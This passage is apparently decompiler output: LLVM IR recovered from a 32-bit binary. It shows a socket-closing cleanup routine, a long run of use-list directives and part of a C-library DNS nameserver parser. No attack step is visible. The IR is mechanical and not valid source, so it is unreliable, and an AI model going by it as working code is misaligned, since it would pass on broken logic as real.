  br label %dec_label_pc_8056352

dec_label_pc_8056343:                             ; preds = %dec_label_pc_805633c
  %v3_8056346 = load i32, i32* %v2_805633c, align 4
  %v5_8056346 = add i32 %v0_805633c, -16
  %v6_8056346 = inttoptr i32 %v5_8056346 to i32*
  store i32 %v3_8056346, i32* %v6_8056346, align 4
  %v1_805634a = sext i16 %stack_var_-192.1 to i32
  %v2_805634a = call i32 @__libc_close(i32 %v1_805634a)
  store i32 %v2_805634a, i32* %eax.global-to-local, align 4
  %v0_805634f = load i32, i32* @esp, align 4
  %v1_805634f = add i32 %v0_805634f, 16
  br label %dec_label_pc_8056352

dec_label_pc_8056352:                             ; preds = %dec_label_pc_805633c.dec_label_pc_8056352_crit_edge, %dec_label_pc_8056343
  %v1_8056359.pre-phi = phi i32 [ %.pre, %dec_label_pc_805633c.dec_label_pc_8056352_crit_edge ], [ %v1_805634a, %dec_label_pc_8056343 ]
  %v0_8056352 = phi i32 [ %v0_805633c, %dec_label_pc_805633c.dec_label_pc_8056352_crit_edge ], [ %v1_805634f, %dec_label_pc_8056343 ]
  %v1_8056355 = add i32 %v0_8056352, 12
  %v2_8056355 = inttoptr i32 %v1_8056355 to i32*
  %v3_8056355 = load i32, i32* %v2_8056355, align 4
  %v5_8056355 = add i32 %v0_8056352, -16
  %v6_8056355 = inttoptr i32 %v5_8056355 to i32*
  store i32 %v3_8056355, i32* %v6_8056355, align 4
  %v2_8056359 = call i32 @free(i32 %v1_8056359.pre-phi)
  store i32 %v2_8056359, i32* %eax.global-to-local, align 4
  %v1_805635e = load i32, i32* @esp, align 4
  %v2_805635e = inttoptr i32 %v1_805635e to i32*
  store i32 %v2_8055c96, i32* %v2_805635e, align 4
  %v2_8056361 = call i32 @free(i32 %v1_8056359.pre-phi)
  store i32 %v2_8056361, i32* @eax, align 4
  %v0_8056366 = load i32, i32* @esp, align 4
  %v1_8056369 = add i32 %v0_8056366, 32
  %v2_8056369 = inttoptr i32 %v1_8056369 to i32*
  store i32 -1, i32* %v2_8056369, align 4
  %v0_8056371 = load i32, i32* @esp, align 4
  %v1_8056371 = add i32 %v0_8056371, 40
  %v2_8056371 = inttoptr i32 %v1_8056371 to i32*
  %v3_8056371 = load i32, i32* %v2_8056371, align 4
  %v13_8056371 = icmp eq i32 %v3_8056371, -1
  br i1 %v13_8056371, label %dec_label_pc_80563c5, label %dec_label_pc_8056378

dec_label_pc_8056378:                             ; preds = %dec_label_pc_8056352
  %v0_8056378 = load i32, i32* @ecx, align 4
  %v2_8056378 = add i32 %v0_8056371, -4
  %v3_8056378 = inttoptr i32 %v2_8056378 to i32*
  store i32 %v0_8056378, i32* %v3_8056378, align 4
  %v1_8056379 = add i32 %v0_8056371, -8
  %v2_8056379 = inttoptr i32 %v1_8056379 to i32*
  store i32 ptrtoint (i8** @global_var_8065b28.1015 to i32), i32* %v2_8056379, align 4
  %v1_805637e = add i32 %v0_8056371, -12
  %v2_805637e = inttoptr i32 %v1_805637e to i32*
  store i32 134564427, i32* %v2_805637e, align 4
  %v1_8056383 = add i32 %v0_8056371, 184
  store i32 %v1_8056383, i32* %ebx.global-to-local, align 4
  %v2_805638a = add i32 %v0_8056371, -16
  %v3_805638a = inttoptr i32 %v2_805638a to i32*
  store i32 %v1_8056383, i32* %v3_805638a, align 4
  %v3_805638b = call i32 @__pthread_return_void(i32 %v1_8056359.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805638b, i32* %eax.global-to-local, align 4
  %v0_8056390 = load i32, i32* @esp, align 4
  %v1_8056390 = inttoptr i32 %v0_8056390 to i32*
  store i32 ptrtoint (i8** @global_var_8065b28.1015 to i32), i32* %v1_8056390, align 4
  %v2_8056397 = call i32 @__pthread_return_0(i32 %v1_8056359.pre-phi)
  store i32 %v2_8056397, i32* %eax.global-to-local, align 4
  %v0_805639c = load i32, i32* @esp, align 4
  %v1_805639c = add i32 %v0_805639c, 56
  %v2_805639c = inttoptr i32 %v1_805639c to i32*
  %v3_805639c = load i32, i32* %v2_805639c, align 4
  store i32 %v3_805639c, i32* %edx.global-to-local, align 4
  %v1_80563a0 = add i32 %v0_805639c, 72
  %v2_80563a0 = inttoptr i32 %v1_80563a0 to i32*
  %v3_80563a0 = load i32, i32* %v2_80563a0, align 4
  store i32 %v3_80563a0, i32* %eax.global-to-local, align 4
  %v1_80563a4 = sext i32 %v3_805639c to i64
  store i64 %v1_80563a4, i64* @global_var_8065b40.1016, align 64
  %v1_80563aa = trunc i32 %v3_80563a0 to i16
  store i16 %v1_80563aa, i16* @global_var_805f884.1017, align 4
  %v1_80563b0 = inttoptr i32 %v0_805639c to i32*
  %v2_80563b0 = load i32, i32* %v1_80563b0, align 4
  store i32 %v2_80563b0, i32* @eax, align 4
  %v3_80563b0 = add i32 %v0_805639c, 4
  %v1_80563b1 = inttoptr i32 %v3_80563b0 to i32*
  %v2_80563b1 = load i32, i32* %v1_80563b1, align 4
  store i32 %v2_80563b1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80563b1, align 4
  %v0_80563b4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80563b4, i32* %v1_80563b0, align 4
  %v3_80563b5 = call i32 @__pthread_return_void(i32 %v1_8056359.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80563b5, i32* %eax.global-to-local, align 4
  %v0_80563ba = load i32, i32* @esp, align 4
  %v1_80563ba = add i32 %v0_80563ba, 32
  %v2_80563ba = inttoptr i32 %v1_80563ba to i32*
  store i32 -1, i32* %v2_80563ba, align 4
  br label %dec_label_pc_80563c2

dec_label_pc_80563c2:                             ; preds = %dec_label_pc_8056236, %dec_label_pc_8056378
  %v0_80563c2 = load i32, i32* @esp, align 4
  %v1_80563c2 = add i32 %v0_80563c2, 16
  br label %dec_label_pc_80563c5

dec_label_pc_80563c5:                             ; preds = %dec_label_pc_8056352, %dec_label_pc_80563c2
  %v0_80563c5 = phi i32 [ %v0_8056371, %dec_label_pc_8056352 ], [ %v1_80563c2, %dec_label_pc_80563c2 ]
  %v1_80563c5 = add i32 %v0_80563c5, 16
  %v2_80563c5 = inttoptr i32 %v1_80563c5 to i32*
  %v3_80563c5 = load i32, i32* %v2_80563c5, align 4
  store i32 %v3_80563c5, i32* %eax.global-to-local, align 4
  %v1_80563c9 = add i32 %v0_80563c5, 220
  %v1_80563cf = inttoptr i32 %v1_80563c9 to i32*
  %v2_80563cf = load i32, i32* %v1_80563cf, align 4
  store i32 %v2_80563cf, i32* @ebx, align 4
  %v3_80563cf = add i32 %v0_80563c5, 224
  %v1_80563d0 = inttoptr i32 %v3_80563cf to i32*
  %v2_80563d0 = load i32, i32* %v1_80563d0, align 4
  store i32 %v2_80563d0, i32* @esi, align 4
  %v3_80563d0 = add i32 %v0_80563c5, 228
  %v1_80563d1 = inttoptr i32 %v3_80563d0 to i32*
  %v2_80563d1 = load i32, i32* %v1_80563d1, align 4
  store i32 %v2_80563d1, i32* @edi, align 4
  %v3_80563d1 = add i32 %v0_80563c5, 232
  %v1_80563d2 = inttoptr i32 %v3_80563d1 to i32*
  %v2_80563d2 = load i32, i32* %v1_80563d2, align 4
  store i32 %v2_80563d2, i32* @ebp, align 4
  ret i32 %v3_80563c5

; uselistorder directives
  uselistorder i32 %v0_80563c5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805639c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056371, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056352, { 1, 0 }
  uselistorder i32 %v1_8056359.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8056304.pre, { 1, 0 }
  uselistorder i32 %v5_80562d7, { 1, 0 }
  uselistorder i32 %v3_80562d7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805629f, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056268, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056236, { 1, 0 }
  uselistorder i32 %v3_8056215, { 1, 0, 2 }
  uselistorder i32 %v0_8056206, { 1, 0 }
  uselistorder i32 %v5_80561fc, { 1, 0 }
  uselistorder i32* %v3_80561fc, { 1, 0 }
  uselistorder i32 %v0_80560d281, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_80561fc, { 2, 1, 0 }
  uselistorder i32 %v5_80561f6, { 1, 0 }
  uselistorder i32 %v1_80561f5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80561f1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80561b5, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805618f, { 1, 0 }
  uselistorder i32 %v1_8056180, { 1, 0 }
  uselistorder i32 %v0_805613f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80560e6, { 1, 2, 0 }
  uselistorder i32 %v0_80560e6, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_80560c0, { 1, 0 }
  uselistorder i32 %v1_80560ba, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80560b5, { 1, 2, 0 }
  uselistorder i32 %v5_80560c058, { 1, 0 }
  uselistorder i32 %v5_8056062, { 1, 0 }
  uselistorder i32 %v3_8056062, { 2, 0, 1, 3 }
  uselistorder i32 %v3_805601a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056000, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8056000, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8055fdf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055fbf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055f65, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8055f4a, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8055f33, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055ebb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055ea8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055e6e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055e4f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055e33, { 1, 0 }
  uselistorder i32 %v3_8055e28, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8055e25, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8055dca, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8055dc5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055dae, { 1, 0 }
  uselistorder i32 %v1_8055d7a, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8055d6b92, { 2, 1, 0 }
  uselistorder i32 %v3_8055d83, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8055d2b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8055d24, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8055c96, { 9, 6, 3, 8, 10, 2, 5, 11, 0, 1, 4, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 248, { 1, 0 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 4, 2, 3, 0 }
  uselistorder i32 68, { 4, 0, 3, 5, 6, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 10000, { 9, 0, 1, 2, 3, 4, 6, 7, 5, 8 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 17, { 17, 15, 9, 14, 4, 5, 3, 10, 11, 12, 13, 18, 8, 1, 0, 16, 6, 7, 2 }
  uselistorder i32 176, { 2, 3, 4, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 43, 44, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 4, 1, 5, 2, 6, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 55, 54, 53, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 56, 26, 23, 21, 22, 24, 25, 27, 28, 29, 30, 31, 35, 36, 37, 33, 32, 34, 38, 45, 43, 44, 42, 41, 40, 39, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 -8, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 51, 52, 53, 50, 16, 17, 11, 12, 13, 14, 15, 18, 19, 20, 21, 23, 22, 24, 25, 26, 0, 27, 28, 29, 31, 32, 30, 33, 34, 35, 36, 43, 41, 42, 40, 39, 38, 37, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -16, { 23, 24, 25, 14, 16, 17, 13, 15, 12, 18, 11, 19, 20, 21, 22, 26, 108, 109, 32, 33, 27, 28, 29, 30, 31, 34, 35, 10, 36, 37, 49, 44, 45, 41, 42, 43, 46, 47, 40, 48, 38, 39, 50, 51, 52, 58, 54, 53, 55, 56, 57, 59, 1, 2, 65, 61, 60, 62, 63, 64, 66, 3, 4, 71, 72, 73, 74, 75, 70, 68, 67, 69, 0, 76, 5, 6, 79, 80, 78, 81, 82, 77, 83, 7, 8, 97, 98, 99, 93, 94, 95, 96, 92, 91, 90, 89, 87, 88, 84, 85, 86, 100, 9, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i16* @global_var_805f884.1017, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8065b40.1016, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8065b28.1015 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8065b28.1015, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80563c5, { 1, 0 }
  uselistorder label %dec_label_pc_80563c2, { 1, 0 }
  uselistorder label %dec_label_pc_8056352, { 1, 0 }
  uselistorder label %dec_label_pc_805633c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056329, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8056304.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80562fc, { 1, 0 }
  uselistorder label %dec_label_pc_80562e3, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056298, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056236, { 1, 0 }
  uselistorder label %dec_label_pc_8056206, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_80561fc, { 1, 0 }
  uselistorder label %dec_label_pc_80561f1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80561ee, { 1, 0 }
  uselistorder label %dec_label_pc_8056169, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80560b1, { 1, 0 }
  uselistorder label %dec_label_pc_8055f33, { 1, 0 }
  uselistorder label %dec_label_pc_8055efc, { 1, 0 }
  uselistorder label %dec_label_pc_8055e6e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055d7a, { 1, 0 }
  uselistorder label %dec_label_pc_8055d64, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_80563d4 = load i32, i32* @ebp, align 4
  store i32 134564427, i32* %stack_var_-216, align 4
  %v3_80563e3 = ptrtoint i32* %stack_var_-216 to i32
  %v2_80563e8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80563e8, i32* @eax, align 4
  %v2_80563f0 = call i32 @__pthread_return_void(i32 %v2_80563e8, i32 134564427)
  %v1_80563fc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f888.953 to i32))
  store i32 %v1_80563fc, i32* @eax, align 4
  %v0_8056404 = load i32, i32* @global_var_8065f74.954, align 4
  %tmp43 = icmp slt i32 %v0_8056404, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80565fb, label %dec_label_pc_8056411

dec_label_pc_8056411:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805e370.1020 to i32), i32* %stack_var_-216, align 4
  %v2_805641d = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805e33e.1021 to i32), i32 ptrtoint (i32* @global_var_805e370.1020 to i32))
  store i32 %v2_805641d, i32* @eax, align 4
  store i32 %v2_805641d, i32* @ebp, align 4
  %v1_8056427 = icmp eq i32 %v2_805641d, 0
  %v1_8056429 = icmp eq i1 %v1_8056427, false
  br i1 %v1_8056429, label %dec_label_pc_80565c6.preheader, label %dec_label_pc_805642f

dec_label_pc_805642f:                             ; preds = %dec_label_pc_8056411
  store i32 ptrtoint (i32* @global_var_805e370.1020 to i32), i32* %stack_var_-216, align 4
  %v2_805643b = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805e34f.1022 to i32), i32 ptrtoint (i32* @global_var_805e370.1020 to i32))
  store i32 %v2_805643b, i32* @ebp, align 4
  %v1_8056445 = icmp eq i32 %v2_805643b, 0
  %v1_8056447 = icmp eq i1 %v1_8056445, false
  br i1 %v1_8056447, label %dec_label_pc_80565c6.preheader, label %dec_label_pc_80565f0

dec_label_pc_80565c6.preheader:                   ; preds = %dec_label_pc_8056411, %dec_label_pc_805642f
  %v2_80565cd = ptrtoint i32* %stack_var_-180 to i32
  %v3_8056501 = add i32 %v3_80563e3, 164
  %v0_80565c6103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80565cd, i32* @ebx, align 4
  %v3_80565d2104 = call i32 @fgets(i32 %v2_80565cd, i32 128, i32 %v0_80565c6103)
  store i32 %v3_80565d2104, i32* @eax, align 4
  %v1_80565da105 = icmp eq i32 %v3_80565d2104, 0
  %v1_80565dc106 = icmp eq i1 %v1_80565da105, false
  br i1 %v1_80565dc106, label %dec_label_pc_8056453.preheader.lr.ph, label %dec_label_pc_80565e2

dec_label_pc_8056453.preheader.lr.ph:             ; preds = %dec_label_pc_80565c6.preheader
  %v4_80564eb = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8056453.preheader

dec_label_pc_8056452:                             ; preds = %dec_label_pc_805645d
  %v1_8056452 = add i32 %v0_805645257, 1
  store i32 %v1_8056452, i32* @ebx, align 4
  %v1_8056453 = inttoptr i32 %v1_8056452 to i8*
  %v2_8056453 = load i8, i8* %v1_8056453, align 1
  %v3_8056453 = zext i8 %v2_8056453 to i32
  %v5_8056453 = and i32 %v6_805645360, -256
  %v6_8056453 = or i32 %v3_8056453, %v5_8056453
  store i32 %v6_8056453, i32* @ecx, align 4
  %v4_8056455 = icmp eq i8 %v2_8056453, 0
  br i1 %v4_8056455, label %dec_label_pc_80565c6.backedge, label %dec_label_pc_805645d

dec_label_pc_805645d:                             ; preds = %dec_label_pc_805645d.lr.ph, %dec_label_pc_8056452
  %v6_805645360 = phi i32 [ %v6_805645355, %dec_label_pc_805645d.lr.ph ], [ %v6_8056453, %dec_label_pc_8056452 ]
  %v2_805645359 = phi i8 [ %v2_805645352, %dec_label_pc_805645d.lr.ph ], [ %v2_8056453, %dec_label_pc_8056452 ]
  %v1_805645358 = phi i8* [ %v1_805645351, %dec_label_pc_805645d.lr.ph ], [ %v1_8056453, %dec_label_pc_8056452 ]
  %v0_805645257 = phi i32 [ %v0_8056453.pre, %dec_label_pc_805645d.lr.ph ], [ %v1_8056452, %dec_label_pc_8056452 ]
  %v2_805645d = sext i8 %v2_805645359 to i32
  store i32 %v2_805645d, i32* @edx, align 4
  store i32 %v0_8056460.pre, i32* @eax, align 4
  %v2_8056465 = mul nsw i32 %v2_805645d, 2
  %v3_8056465 = add i32 %v0_8056460.pre, %v2_8056465
  %v4_8056465 = inttoptr i32 %v3_8056465 to i8*
  %v5_8056465 = load i8, i8* %v4_8056465, align 1
  %v6_8056465 = and i8 %v5_8056465, 32
  %v7_8056465 = icmp eq i8 %v6_8056465, 0
  %v1_8056469 = icmp eq i1 %v7_8056465, false
  br i1 %v1_8056469, label %dec_label_pc_8056452, label %dec_label_pc_805646b

dec_label_pc_805646b:                             ; preds = %dec_label_pc_805645d
  %v10_805646b = icmp eq i8 %v2_805645359, 10
  br i1 %v10_805646b, label %dec_label_pc_80565c6.backedge, label %dec_label_pc_8056474

dec_label_pc_80565c6.backedge:                    ; preds = %dec_label_pc_8056453.preheader, %dec_label_pc_8056452, %dec_label_pc_805658c, %dec_label_pc_80565bb, %dec_label_pc_8056593, %dec_label_pc_805646b, %dec_label_pc_8056474, %dec_label_pc_8056545
  %v0_80565c6 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80565cd, i32* @ebx, align 4
  %v3_80565d2 = call i32 @fgets(i32 %v2_80565cd, i32 128, i32 %v0_80565c6)
  store i32 %v3_80565d2, i32* @eax, align 4
  %v1_80565da = icmp eq i32 %v3_80565d2, 0
  %v1_80565dc = icmp eq i1 %v1_80565da, false
  br i1 %v1_80565dc, label %dec_label_pc_8056453.preheader, label %dec_label_pc_80565e2

dec_label_pc_8056474:                             ; preds = %dec_label_pc_805646b
  %v10_805647c = icmp eq i8 %v2_805645359, 35
  %v1_805647f = icmp eq i1 %v10_805647c, false
  br i1 %v1_805647f, label %dec_label_pc_80564d0.preheader, label %dec_label_pc_80565c6.backedge

dec_label_pc_80564d0.preheader:                   ; preds = %dec_label_pc_8056474
  %v2_80564d06 = load i8, i8* %v1_805645358, align 1
  %v3_80564d07 = icmp eq i8 %v2_80564d06, 0
  br i1 %v3_80564d07, label %dec_label_pc_80564dc, label %dec_label_pc_80564d5

dec_label_pc_8056486:                             ; preds = %dec_label_pc_80564d5
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_805648a = load i32, i32* @esp, align 4
  %v3_805648a = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_805648a = add nuw nsw i32 %v3_805648a, 152
  %v5_805648a = add i32 %v4_805648a, %v1_805648a
  %v6_805648a = inttoptr i32 %v5_805648a to i32*
  store i32 %v0_805648a, i32* %v6_805648a, align 4
  %v0_8056494.pre = load i32, i32* @ebx, align 4
  %v4_8056494.pre = load i32, i32* @ecx, align 4
  %v1_805649461 = inttoptr i32 %v0_8056494.pre to i8*
  %v2_805649462 = load i8, i8* %v1_805649461, align 1
  %v3_805649463 = zext i8 %v2_805649462 to i32
  %v5_805649464 = and i32 %v4_8056494.pre, -256
  %v6_805649465 = or i32 %v3_805649463, %v5_805649464
  %v4_805649666 = icmp eq i8 %v2_805649462, 0
  br i1 %v4_805649666, label %dec_label_pc_80564b3.preheader, label %dec_label_pc_805649a.lr.ph

dec_label_pc_805649a.lr.ph:                       ; preds = %dec_label_pc_8056486
  %v0_805649d.pre = load i32, i32* @global_var_805f61c, align 4
  br label %dec_label_pc_805649a

dec_label_pc_8056493:                             ; preds = %dec_label_pc_80564a8
  %v1_8056493 = add i32 %v0_805649367, 1
  store i32 %v1_8056493, i32* @ebx, align 4
  %v1_8056494 = inttoptr i32 %v1_8056493 to i8*
  %v2_8056494 = load i8, i8* %v1_8056494, align 1
  %v3_8056494 = zext i8 %v2_8056494 to i32
  %v5_8056494 = and i32 %v6_805649469, -256
  %v6_8056494 = or i32 %v3_8056494, %v5_8056494
  %v4_8056496 = icmp eq i8 %v2_8056494, 0
  br i1 %v4_8056496, label %dec_label_pc_80564b3.preheader, label %dec_label_pc_805649a

dec_label_pc_805649a:                             ; preds = %dec_label_pc_805649a.lr.ph, %dec_label_pc_8056493
  %v6_805649469 = phi i32 [ %v6_805649465, %dec_label_pc_805649a.lr.ph ], [ %v6_8056494, %dec_label_pc_8056493 ]
  %v2_805649468 = phi i8 [ %v2_805649462, %dec_label_pc_805649a.lr.ph ], [ %v2_8056494, %dec_label_pc_8056493 ]
  %v0_805649367 = phi i32 [ %v0_8056494.pre, %dec_label_pc_805649a.lr.ph ], [ %v1_8056493, %dec_label_pc_8056493 ]
  %v2_805649a = sext i8 %v2_805649468 to i32
  store i32 %v2_805649a, i32* @edx, align 4
  store i32 %v0_805649d.pre, i32* @eax, align 4
  %v2_80564a2 = mul nsw i32 %v2_805649a, 2
  %v3_80564a2 = add i32 %v0_805649d.pre, %v2_80564a2
  %v4_80564a2 = inttoptr i32 %v3_80564a2 to i8*
  %v5_80564a2 = load i8, i8* %v4_80564a2, align 1
  %v6_80564a2 = and i8 %v5_80564a2, 32
  %v7_80564a2 = icmp eq i8 %v6_80564a2, 0
  %v1_80564a6 = icmp eq i1 %v7_80564a2, false
  br i1 %v1_80564a6, label %dec_label_pc_80564b3.preheader, label %dec_label_pc_80564a8

dec_label_pc_80564a8:                             ; preds = %dec_label_pc_805649a
  %v10_80564a8 = icmp eq i8 %v2_805649468, 10
  %v1_80564ab = icmp eq i1 %v10_80564a8, false
  br i1 %v1_80564ab, label %dec_label_pc_8056493, label %dec_label_pc_80564b3.preheader

dec_label_pc_80564b3.preheader:                   ; preds = %dec_label_pc_80564a8, %dec_label_pc_805649a, %dec_label_pc_8056493, %dec_label_pc_8056486
  %v0_8056493.lcssa = phi i32 [ %v0_8056494.pre, %dec_label_pc_8056486 ], [ %v1_8056493, %dec_label_pc_8056493 ], [ %v0_805649367, %dec_label_pc_805649a ], [ %v0_805649367, %dec_label_pc_80564a8 ]
  %v6_8056494.lcssa = phi i32 [ %v6_805649465, %dec_label_pc_8056486 ], [ %v6_8056494, %dec_label_pc_8056493 ], [ %v6_805649469, %dec_label_pc_805649a ], [ %v6_805649469, %dec_label_pc_80564a8 ]
  %v1_80564b375 = inttoptr i32 %v0_8056493.lcssa to i8*
  %v2_80564b376 = load i8, i8* %v1_80564b375, align 1
  %v3_80564b377 = zext i8 %v2_80564b376 to i32
  %v5_80564b378 = and i32 %v6_8056494.lcssa, -256
  %v6_80564b379 = or i32 %v3_80564b377, %v5_80564b378
  store i32 %v6_80564b379, i32* @ecx, align 4
  %v4_80564b580 = icmp eq i8 %v2_80564b376, 0
  br i1 %v4_80564b580, label %dec_label_pc_80564cc, label %dec_label_pc_80564b9

dec_label_pc_80564af:                             ; preds = %dec_label_pc_80564c7, %dec_label_pc_80564b9
  store i8 0, i8* %v1_80564b382, align 1
  %v0_80564b2 = load i32, i32* @ebx, align 4
  %v1_80564b2 = add i32 %v0_80564b2, 1
  store i32 %v1_80564b2, i32* @ebx, align 4
  %v4_80564b3.pre = load i32, i32* @ecx, align 4
  %v1_80564b3 = inttoptr i32 %v1_80564b2 to i8*
  %v2_80564b3 = load i8, i8* %v1_80564b3, align 1
  %v3_80564b3 = zext i8 %v2_80564b3 to i32
  %v5_80564b3 = and i32 %v4_80564b3.pre, -256
